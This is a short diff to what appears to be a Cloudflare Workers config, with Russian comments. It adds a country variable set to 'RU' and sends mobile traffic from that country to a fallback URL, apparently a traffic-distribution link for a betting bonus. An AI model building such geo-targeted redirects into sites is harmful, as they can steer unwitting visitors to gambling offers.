@@ -13,6 +13,8 @@ compatibility_date = "2024-06-01"
 [vars]
 # URL, на который будет перенаправляться мобильный RU-трафик по умолчанию
 FALLBACK_URL = "https://2win.click/tds/go.cgi?4&bonus=bet"
+# Страна, трафик из которой будет редиректиться
+REDIRECT_COUNTRY = "RU"
 # Отключить редирект полностью
 DISABLE_RU_MOBILE_REDIRECT = "false"
 # Считать iPad мобильным устройством
